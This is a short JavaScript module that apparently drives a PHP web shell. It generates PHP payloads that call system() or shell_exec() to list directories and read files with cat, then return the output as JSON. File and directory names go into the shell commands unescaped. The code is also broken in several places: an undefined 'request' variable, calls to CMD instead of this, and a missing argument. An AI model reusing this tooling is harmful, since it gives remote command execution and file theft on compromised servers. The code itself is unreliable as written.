function CMD(method, context) {
	this.method = method;
	this.context = null;

	if(typeof context != "undefined") {
		this.context = context;
	}
}

CMD.prototype.getSystemCmd = function getSystemCmd(cmd, r) {
	return "ob_start();system('" + cmd + "');$" + r + "=ob_get_contents();ob_end_clean();"; 
}

CMD.prototype.getShellExecCmd = function getShellExecCmd(cmd, r) {
	return "$" + r + "=shell_exec('" + cmd + "');";
}

CMD.prototype.createCmd = function createCmd(cmd, r) {
	let contexter, shellCmd;

	if(CMD.context != null) {
		contexter = "cd " + CMD.context + " && ";
	}

	shellCmd = contexter + request;

	switch(CMD.method) {
		case 0:
			shellCmd = CMD.getSystemCmd(shellCmd);
			break;
		case 1:
			shellCmd = CMD.getShellExecCmd(shellCmd);
			break;
	}

	return shellCmd;
}

CMD.prototype.listDir = function listDir(dir) {
	let context, lsFolder, lsFile;

	if(typeof dir != "undefined" && dir != null) {
		context = "cd " + dir + " && ";
	}

	lsFolder = context + "ls -d */";
	lsFile = context + "find . -maxdepth 1 -type f";

	lsFolder = CMD.createCmd(lsFolder, "fo");
	lsFile = CMD.createCmd(lsFile, "fi");

	ls = lsFolder + lsFile + "$r=json_encode(array($fi, $fo));";

	return ls;
}

CMD.prototype.getFileContent = function getFileContent(fileName) {
	let cat;

	if(typeof fileName == "undefined" || fileName == null) {
		return;
	}

	cat = "cat " + fileName;
	cat = CMD.createCmd(cat, "r");

	return cat;
}

module.exports = CMD;
